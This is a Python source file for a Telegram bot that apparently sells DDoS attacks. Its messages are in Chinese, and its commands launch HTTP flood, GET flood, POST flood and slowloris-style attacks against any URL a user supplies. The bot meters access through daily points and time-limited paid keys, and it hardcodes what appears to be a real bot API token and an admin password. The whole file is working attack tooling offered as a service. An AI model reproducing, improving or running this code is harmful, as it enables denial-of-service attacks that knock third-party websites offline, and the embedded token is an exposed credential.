from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import logging
import asyncio
import random
import time
import aiohttp
import uuid

API_TOKEN = '8042215508:AAFPbLKUZuZBiyCkT_cciMw5VAE5xB2OBo0'  # 替换为您的机器人API令牌
ADMIN_PASSWORD = '12321'  # 设置管理员密码

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
storage = MemoryStorage()  # 创建内存存储
dp = Dispatcher(bot, storage=storage)  # 传入 bot 实例

# 用于存储攻击状态
attack_status = {}
# 用户积分存储
user_points = {}
# 用户每日使用状态
user_daily_status = {}
# 用户管理员状态
admin_users = {}
# 用户密钥存储
user_keys = {}

# 定义密钥类型及其有效期
KEY_TYPES = {
    "测试卡": 3600,  # 1小时
    "天卡": 86400,   # 1天
    "周卡": 604800,  # 1周
    "月卡": 2592000, # 1个月
}

async def send_request(session, target_url, data=None):
    if data:
        async with session.post(target_url, json=data) as response:
            logging.info(f"POST Flood Attack - {target_url}: Status {response.status}")
    else:
        async with session.get(target_url) as response:
            logging.info(f"HTTP Flood Attack - {target_url}: Status {response.status}")

async def http_flood_attack(target_url, duration, attack_key, concurrency):
    async with aiohttp.ClientSession() as session:
        end_time = time.time() + duration
        tasks = []
        while time.time() < end_time:
            tasks.append(send_request(session, target_url))
            if len(tasks) >= concurrency:
                await asyncio.gather(*tasks)
                tasks = []
        if tasks:
            await asyncio.gather(*tasks)
    attack_status[attack_key]['active'] = False

async def post_flood_attack(target_url, duration, attack_key, concurrency):
    async with aiohttp.ClientSession() as session:
        end_time = time.time() + duration
        tasks = []
        while time.time() < end_time:
            data = {'key': 'value'}  # 示例数据
            tasks.append(send_request(session, target_url, data))
            if len(tasks) >= concurrency:
                await asyncio.gather(*tasks)
                tasks = []
        if tasks:
            await asyncio.gather(*tasks)
    attack_status[attack_key]['active'] = False

async def get_flood_attack(target_url, duration, attack_key, concurrency):
    async with aiohttp.ClientSession() as session:
        end_time = time.time() + duration
        tasks = []
        while time.time() < end_time:
            tasks.append(send_request(session, target_url))  # 使用 GET 请求
            if len(tasks) >= concurrency:
                await asyncio.gather(*tasks)
                tasks = []
        if tasks:
            await asyncio.gather(*tasks)
    attack_status[attack_key]['active'] = False

async def slowloris_attack(target_url, duration, attack_key):
    async with aiohttp.ClientSession() as session:
        end_time = time.time() + duration
        while time.time() < end_time:
            await session.get(target_url, headers={'Connection': 'keep-alive'})
            await asyncio.sleep(1)  # 每秒发送一次请求
    attack_status[attack_key]['active'] = False

@dp.message_handler(commands=['start'])
async def handle_start_command(message: types.Message):
    user_id = message.from_user.id
    await message.answer(f"欢迎使用此免费ddos机器人，您的id是 {user_id}。请使用 /attack 命令开始攻击。")

@dp.message_handler(commands=['help'])
async def handle_help_command(message: types.Message):
    help_text = (
        "可用命令:\n"
        "/start - 开始与机器人交互\n"
        "/help - 查看帮助信息\n"
        "/qd - 领取每日积分\n"
        "/attack <URL> <时间> <http_flood|get_flood|post_flood|slowloris> <并发数量> - 开始攻击\n"
        "/status <URL> - 查看攻击状态\n"
        "/admin <password> - 获得管理员权限\n"
        "/set_points <user_id> <points> - 设置用户积分 (管理员命令)\n"
        "/generate_key - 生成密钥 (管理员命令)\n"
        "/delete_key - 删除密钥 (管理员命令)\n"
        "/check_key - 检查密钥 (用户命令)\n"
        "/use <key> - 使用密钥并获得攻击权限\n"
        "/info - 查看您的当前积分和密钥信息 (用户命令)\n"
    )
    await message.answer(help_text)

@dp.message_handler(commands=['qd'])
async def handle_qd_command(message: types.Message):
    user_id = message.from_user.id
    current_date = time.strftime("%Y-%m-%d")
    
    if user_daily_status.get(user_id) == current_date:
        await message.answer("您今天已经领取过积分了，明天再来吧！")
        return

    points = random.randint(120, 500)
    user_points[user_id] = user_points.get(user_id, 0) + points
    user_daily_status[user_id] = current_date  # 更新用户每日状态

    await message.answer(f"您获得了 {points} 积分！当前积分: {user_points[user_id]}")

@dp.message_handler(commands=['info'])  # 添加/info命令
async def handle_info_command(message: types.Message):
    user_id = message.from_user.id
    points = user_points.get(user_id, 0)
    if user_id in user_keys:
        key_info = user_keys[user_id]
        expiry_time = key_info['expiry'] - time.time()
        key_status = f"您的密钥: {key_info['key']}, 有效期: {expiry_time:.2f}秒。"
    else:
        key_status = "您没有密钥。"
    
    await message.answer(f"当前积分: {points}\n{key_status}")

@dp.message_handler(commands=['attack'])
async def handle_attack_command(message: types.Message):
    user_id = message.from_user.id
    args = message.text.split()[1:]  # 获取命令后面的参数

    if len(args) != 4:
        await message.answer("参数数量不正确，请使用格式: /attack <URL> <时间> <http_flood|get_flood|post_flood|slowloris> <并发数量>")
        return

    target_url = args[0]
    attack_time = int(args[1])
    method = args[2].lower()
    concurrency = min(max(int(args[3]), 1), 2000000)  # 2000000

    # 设置用户限制
    if user_id in admin_users:
        max_currencies = 10000000000
        max_duration = 10000000000
    else:
        max_currencies = 10
        max_duration = 300  # 300 seconds for normal users

    # 检查用户是否拥有有效的密钥
    if user_id in user_keys:
        key_info = user_keys[user_id]
        if key_info['expiry'] < time.time():
            await message.answer("您的密钥已过期，请重新生成密钥。")
            return
    else:
        required_points = attack_time  # 每秒消耗1积分
        if user_points.get(user_id, 0) < required_points:
            await message.answer("积分不足，无法进行攻击。")
            return
        # 扣除积分
        user_points[user_id] -= required_points

    # 检查攻击时间和货币数限制
    if attack_time > max_duration:
        await message.answer(f"攻击时间不能超过 {max_duration} 秒。")
        return

    if required_points > max_currencies:
        await message.answer(f"您的积分不能超过 {max_currencies}。")
        return

    attack_key = f"{user_id}_{target_url}"  # 唯一标识攻击
    attack_status[attack_key] = {"active": True, "method": method, "time_left": attack_time, "target_url": target_url}

    # 开始攻击
    if method == "http_flood":
        await http_flood_attack(target_url, attack_time, attack_key, concurrency)
    elif method == "get_flood":
        await get_flood_attack(target_url, attack_time, attack_key, concurrency)
    elif method == "post_flood":
        await post_flood_attack(target_url, attack_time, attack_key, concurrency)
    elif method == "slowloris":
        await slowloris_attack(target_url, attack_time, attack_key)
    else:
        await message.answer("未知的攻击方法。")
        return

    await message.answer(f"开始对 {target_url} 进行攻击，持续时间: {attack_time} 秒。")

@dp.message_handler(commands=['status'])
async def handle_status_command(message: types.Message):
    user_id = message.from_user.id
    args = message.text.split()[1:]  # 获取命令后面的参数

    if len(args) != 1:
        await message.answer("参数数量不正确，请使用格式: /status <URL>")
        return

    target_url = args[0]
    attack_key = f"{user_id}_{target_url}"  # 唯一标识攻击

    if attack_key in attack_status:
        status = attack_status[attack_key]
        if status['active']:
            await message.answer(f"攻击正在进行中，方法: {status['method']}, 剩余时间: {status['time_left']} 秒。")
        else:
            await message.answer("攻击已完成。")
    else:
        await message.answer(f"没有对 {target_url} 进行的攻击。")

@dp.message_handler(commands=['admin'])
async def handle_admin_command(message: types.Message):
    user_id = message.from_user.id
    args = message.text.split()[1:]  # 获取命令后面的参数

    if len(args) != 1:
        await message.answer("参数数量不正确，请使用格式: /admin <password>")
        return

    password = args[0]
    if password == ADMIN_PASSWORD:
        admin_users[user_id] = True
        await message.answer("您已获得管理员权限。")
    else:
        await message.answer("密码错误，无法获得管理员权限。")

@dp.message_handler(commands=['set_points'])
async def handle_set_points_command(message: types.Message):
    user_id = message.from_user.id
    if user_id not in admin_users:
        await message.answer("只有管理员可以执行此命令。")
        return

    args = message.text.split()[1:]
    if len(args) != 2:
        await message.answer("参数数量不正确，请使用格式: /set_points <user_id> <points>")
        return

    target_user_id = int(args[0])
    points = int(args[1])
    user_points[target_user_id] = points
    await message.answer(f"用户 {target_user_id} 的积分已设置为 {points}。")

@dp.message_handler(commands=['generate_key'])
async def handle_generate_key_command(message: types.Message):
    user_id = message.from_user.id
    if user_id not in admin_users:
        await message.answer("只有管理员可以执行此命令。")
        return

    key_type = message.get_args().strip()
    if key_type not in KEY_TYPES:
        await message.answer("密钥类型无效。可用密钥类型为: 测试卡, 天卡, 周卡, 月卡。")
        return

    new_key = str(uuid.uuid4())  # 生成唯一密钥
    expiry_time = time.time() + KEY_TYPES[key_type]  # 计算密钥过期时间

    user_keys[user_id] = {"key": new_key, "expiry": expiry_time}  # 存储密钥和过期时间

    await message.answer(f"生成了新的密钥: {new_key}, 类型: {key_type}, 有效期: {KEY_TYPES[key_type]} 秒。")

@dp.message_handler(commands=['delete_key'])
async def handle_delete_key_command(message: types.Message):
    user_id = message.from_user.id
    if user_id not in admin_users:
        await message.answer("只有管理员可以执行此命令。")
        return

    target_user_id = int(message.get_args().strip())
    if target_user_id in user_keys:
        del user_keys[target_user_id]
        await message.answer(f"已删除用户 {target_user_id} 的密钥。")
    else:
        await message.answer(f"用户 {target_user_id} 没有密钥。")

@dp.message_handler(commands=['check_key'])
async def handle_check_key_command(message: types.Message):
    user_id = message.from_user.id

    if user_id in user_keys:
        key_info = user_keys[user_id]
        expiry_time = key_info['expiry'] - time.time()
        await message.answer(f"您的密钥: {key_info['key']}, 有效期: {expiry_time:.2f}秒。")
    else:
        await message.answer("您没有密钥。")

@dp.message_handler(commands=['use'])
async def handle_use_command(message: types.Message):
    user_id = message.from_user.id
    key = message.get_args().strip()

    if user_id in user_keys:
        await message.answer("您已拥有一个激活的密钥。")
        return

    for stored_user_id, key_info in user_keys.items():
        if key_info['key'] == key:
            if key_info['expiry'] < time.time():
                await message.answer("此密钥已过期。")
                return
            user_keys[user_id] = key_info
            await message.answer("密钥已激活！")
            return

    await message.answer("无效的密钥。")

async def main():
    await dp.start_polling()

if __name__ == '__main__':
    asyncio.run(main()) 